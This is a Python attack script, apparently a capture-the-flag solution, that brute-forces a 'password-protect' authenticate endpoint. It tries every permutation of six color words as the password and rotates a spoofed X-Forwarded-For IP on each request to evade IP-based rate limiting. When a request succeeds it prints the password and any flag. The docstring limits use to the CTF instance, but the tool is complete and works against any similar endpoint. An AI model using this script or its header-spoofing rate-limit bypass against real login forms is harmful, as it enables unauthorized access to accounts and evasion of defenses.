#!/usr/bin/env python3
"""xfwd_bruteforce.py

Brute-force the Puzmat endpoint by rotating X-Forwarded-For for each request.

Usage:
    python3 xfwd_bruteforce.py --url http://localhost:9004/apps/password-protect/authenticate

Behavior:
 - For each permutation of the six colors, the script sends a JSON POST with
   the payload expected by the server and sets a fresh X-Forwarded-For IP.
 - If the server returns 200 the script prints the found password and exits.
 - If the server returns 429, the script respects Retry-After (if present)
   or uses an exponential backoff, then continues with a new random IP.
 - The script prints progress every `--progress` attempts.

Notes:
 - This is intended for the CTF instance only. Don't use against real sites.
"""

import argparse
import requests
import random
import ipaddress
import time
from itertools import permutations
import sys
import json

DEFAULT_COLORS = ['yellow', 'blue', 'orange', 'green', 'red', 'pink']

def random_ipv4():
    # produce a "random" but valid-looking IPv4 address, avoiding special blocks a bit
    # we keep it simple: generate from 1.0.0.1 - 223.255.255.254
    while True:
        ip_int = random.getrandbits(32)
        octets = [(ip_int >> (8 * i)) & 0xff for i in (3,2,1,0)]
        # avoid 0.* and 127.* and 224-255.*
        if octets[0] in (0, 10, 127, 169, 172, 192, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255):
            # avoid many reserved blocks; accept most public-like addresses, but this is not perfect.
            continue
        return "{}.{}.{}.{}".format(*octets)

def make_payload(password):
    return {"page_id":"61216424102","article_id":"","product_id":"","collection_ids":"","version":"2","password":password}

def parse_args():
    p = argparse.ArgumentParser(description="Bruteforce Puzmat by rotating X-Forwarded-For header.")
    p.add_argument('--url', '-u', required=True,
                   help="Target authenticate URL (e.g. http://localhost:9004/apps/password-protect/authenticate)")
    p.add_argument('--colors', '-c', nargs='*', default=DEFAULT_COLORS,
                   help="List of color tokens to permute (default: yellow blue orange green red pink)")
    p.add_argument('--delay', '-d', type=float, default=0.02,
                   help="Small delay between requests (seconds). Default 0.02")
    p.add_argument('--progress', '-p', type=int, default=50,
                   help="Show progress every N attempts (default 50)")
    p.add_argument('--seed', type=int, default=None, help="Random seed (optional)")
    return p.parse_args()

def main():
    args = parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    url = args.url.rstrip('/')
    colors = args.colors
    total = 1
    for i in range(2, len(colors)+1):
        total *= i

    print(f"[+] Brute forcing {len(colors)} colors ({total} permutations) against {url}")
    session = requests.Session()
    attempts = 0
    backoff_base = 1.0

    try:
        for combo in permutations(colors):
            password = ''.join(combo)
            payload = make_payload(password)

            # set a fresh random X-Forwarded-For to bypass IP-based rate limits
            ip = random_ipv4()
            headers = {
                'Content-Type': 'application/json',
                'X-Forwarded-For': ip,
                # optional user agent
                'User-Agent': 'puzmat-bruteforce/1.0'
            }

            try:
                resp = session.post(url, json=payload, headers=headers, timeout=10)
            except requests.exceptions.RequestException as e:
                print(f"[!] Request error for {password}: {e} -- retrying after short delay")
                time.sleep(1)
                continue

            attempts += 1

            if resp.status_code == 200:
                # success
                print()
                print("[+] SUCCESS! Password found:")
                print(password)
                print(f"[+] Requests made: {attempts}")
                # try to print JSON if server returned it
                try:
                    j = resp.json()
                    if isinstance(j, dict) and 'flag' in j:
                        print("[+] Flag (from response):", j['flag'])
                except Exception:
                    pass
                return 0

            if resp.status_code == 403:
                # wrong
                if attempts % args.progress == 0:
                    print(f"[{attempts}] tried {password} (403)")
            elif resp.status_code == 429:
                # rate-limited â€” respect Retry-After if present
                ra = resp.headers.get('Retry-After')
                try:
                    wait = int(float(ra)) if ra is not None else None
                except Exception:
                    wait = None
                if wait is None:
                    # exponential backoff fallback
                    wait = backoff_base
                    backoff_base = min(backoff_base * 2, 60.0)
                print(f"[!] 429 received for IP {ip}. Waiting {wait}s then continuing with new IP.")
                time.sleep(wait)
                # after waiting, continue (we will use a new IP on next loop)
            else:
                # other response codes (500, 400, etc.)
                if attempts % args.progress == 0:
                    text = resp.text.strip().splitlines()[0] if resp.text else ''
                    print(f"[{attempts}] tried {password} -> status {resp.status_code} {text}")

            time.sleep(args.delay)

        print("[!] Exhausted permutations, password not found.")
        return 2

    except KeyboardInterrupt:
        print("\n[-] Interrupted by user.")
        return 130

if __name__ == '__main__':
    sys.exit(main())
